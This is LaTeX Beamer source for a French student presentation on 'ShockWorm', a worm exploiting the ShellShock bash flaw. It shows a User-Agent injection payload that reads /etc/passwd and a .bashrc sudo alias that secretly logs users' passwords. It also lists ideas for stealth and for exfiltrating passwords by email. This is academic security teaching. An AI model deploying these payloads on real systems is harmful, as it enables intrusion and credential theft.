\documentclass[11pt]{beamer}
\usetheme{Warsaw}
\usepackage[utf8]{inputenc}
\usepackage[francais]{babel}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{listings}
\lstset{ % General setup for the package
	language=bash,
	basicstyle=\small\sffamily,
	numbers=left,
 	numberstyle=\tiny,
	frame=tb,
	tabsize=4,
	columns=fixed,
	showstringspaces=false,
	showtabs=false,
	keepspaces=true,
	breaklines=true,
	moredelim=[is][\color{red}\underbar]{_}{_}
}
\AtBeginSection[]{
  \begin{frame}
  \vfill
  \centering
  \begin{beamercolorbox}[sep=8pt,center,shadow=true,rounded=true]{title}
    \usebeamerfont{title}\insertsectionhead\par%
  \end{beamercolorbox}
  \vfill
  \end{frame}
}
\author{Mathieu Valois - M1 Informatique - \\ 21102894@etu.unicaen.fr}
\title{ShockWorm - Un ver basé sur ShellShock}
%\setbeamercovered{transparent} 
%\setbeamertemplate{navigation symbols}{} 
\logo{\includegraphics[scale=0.3]{images/cc-by-nc-sa.png}  \includegraphics[scale=0.1]{images/shellshock.png}  \includegraphics[scale=0.5]{images/unicaen_logo_rvb_noir_V2.png}}
\institute{Université de Caen Basse-Normandie} 
%\date{} 
%\subject{} 
\expandafter\def\expandafter\insertshorttitle\expandafter{%
  \insertshorttitle\hfill%
  \insertframenumber\,/\,\inserttotalframenumber}
\begin{document}
%\lstset{inputencoding=utf8/latin1}
\setbeamertemplate{headline}{}
\begin{frame}
\titlepage
\end{frame}

\begin{frame}
\tableofcontents
\end{frame}

\section{Qu'est-ce qu'un ver ?}
\begin{frame}{Qu'est-ce qu'un ver ?}
\begin{itemize}
\item un programme informatique capable de s'auto-répliquer
\item à la différence des virus, le ver se déplace seul sans programme hôte
\item requiert une vulnérabilité du système pour y pénétrer
\item peut être bienveillant ou malveillant
\item se déplace bien plus rapidement que les virus à travers les réseaux car il ne demande pas d'interaction des utilisateurs
\end{itemize}
\begin{center}
\includegraphics[scale=0.1]{images/worm.jpeg}
\end{center}
\end{frame}

\section{Le but du projet}
\begin{frame}{Le but du projet}
\begin{itemize}
\item programmer un ver, si possible n'existant pas déjà, qui peut se répliquer de machine en machine
\item choisir une vulnérabilité connue à utiliser pour permettre au ver d'attaquer des machines exposées à cette vulnérabilité
\item lâcher le ver dans un réseau confiné de machines vulnérables pour voir la progression du ver
\end{itemize}
\end{frame}

\section{La vulnérabilité : ShellShock}
\begin{frame}{La vulnérabilité : ShellShock}
\noindent
 \parbox[t]{8cm}{
ShellShock est : 
\begin{itemize}
\item une vulnérabilité de Bash
\item introduite dans le code de bash en 1989 (d'après Brian Fox, le principal développeur)  et découverte en septembre 2014 (ce qui fait un bout de temps)
\item sachant que bash est massivement utilisé dans tout les systèmes UNIX, ShellShock était présente sur énormément de machines, des serveurs jusqu'au systèmes embarqués en passant par les caméras IP
\end{itemize}}
     \hfill
       \raisebox{\dimexpr-\height+\baselineskip}{\includegraphics[scale=0.1]{images/brian_fox.png}}
\end{frame}

\section{Un peu de technique pour comprendre}
\begin{frame}[fragile]{Un peu de technique pour comprendre}

Soit ce bloc de code bash:

\begin{lstlisting}
$ env myfunction='() { echo "hello world"; } _'_ \
bash -c "myfunction;"
\end{lstlisting}
Cela déclare une fonction qui affiche "hello world" et appelle un sous-processus pour exécuter cette toute nouvelle fonction.
\end{frame}

\begin{frame}[fragile]{Un peu de technique pour comprendre}
Soit maintenant ce bloc de code:

\begin{lstlisting}
$ env myfunction='() { echo "hello world"; } \
echo "shellshock attaque !" _'_ \
bash -c "myfunction;"
\end{lstlisting}

Soyez attentif au guillemet final de la déclaration de la fonction (souligné en rouge). Dans ce deuxième bloc de code, il est mal placé et force ainsi le sous-processus à exécuter la deuxième ligne ("shellshock attaque !") AVANT même la fonction en elle-même.

\end{frame}

\begin{frame}[fragile]{Comment l'exploiter ?}

On s'est rendu compte que beaucoup de sites web utilisent des scripts bash pour l'affichage de contenu : c'est ce qu'on appelle les CGI (Common Gateway Interface).

Il est alors possible d'injecter ce genre de code dans les en-têtes HTTP, de cette manière :

\begin{lstlisting}
$ "User-Agent: '() { :;}; cat /etc/passwd' bash -c echo"
\end{lstlisting}

Ce code copie tous les mots de passe (heureusement hachés salés) de la machine distante sur laquelle est présent le script CGI vulnérable, et les affiche sur la page web.

\end{frame}

\begin{frame}{Comment l'exploiter ?}
Tous les protocoles qui utilisent bash rien qu'un petit peu sont susceptibles d'être ciblés. Il y a eu des attaques contre des serveurs DHCP (et aussi clients), DNS, HTTP et d'autres. 
Les attaques utilisent le même bout de code que précédemment, à quelques détails près.

\end{frame}


\section{Les capacités du ver}
\begin{frame}{Les capacités du ver}

\begin{itemize}
\item infecter une nouvelle machine vulnérable
\item persiste aux redémarrages sans et avec permission root 
\item intercepte les mots de passe en surchargeant la commande sudo
\item une fois quelques mots de passe capturés, il les envoie par mail à l'adresse définie, accompagnés des adresses IP de la machine
\end{itemize}


\begin{center}
\includegraphics[scale=0.08]{images/linux_force.jpg}
\end{center}
\end{frame}

\section{Capturer les mots de passe}
\begin{frame}[fragile]{Capturer les mots de passe}
Pour capturer les mots de passe des utilisateurs, on définit un alias \textbf{sudo} en écrivant ceci dans le \textbf{.bashrc} de chaque utilisateur : 
\begin{lstlisting}
capture(){
    echo -n "[sudo] password for $USER: " && 
    read -rs password && 
    echo "$password:$(whoami)" >> /tmp/passwords && 
    echo "$password" | /usr/bin/sudo -S "$@"
}
alias sudo=capture;
\end{lstlisting}

\end{frame}

\section{Certaines améliorations possibles}
\begin{frame}{Certaines améliorations possibles}
\begin{itemize}
\item être plus discret en empêchant les commandes de "monitoring" (ps, netstat, ...) de voir le processus
\item récupérer plus d'informations sur les utilisateurs de façon automatique
\item rechercher sur le système des clés de chiffrement qui pourraient être intéressantes
\item rechercher des documents sensibles
\end{itemize}
\end{frame}

\section{Démo infection}

\section{Questions ?}

\begin{frame}{Pourquoi ce projet ?}
\begin{itemize}
\item j'ai lu quelques ouvrages à ce sujet, j'avais donc quelques savoirs qui m'ont aidé
\item la découverte publique de ShellShock s'est faite pile au moment où nous devions choisir les projets
\item sujet orienté recherche plutôt que d'écriture de code
\item lié à la sécurité, domaine que j'apprécie particulièrement
\item il n'y avait pas vraiment d'autres sujets intéressants selon moi pour les E-Secure
\end{itemize}
\end{frame}

\end{document}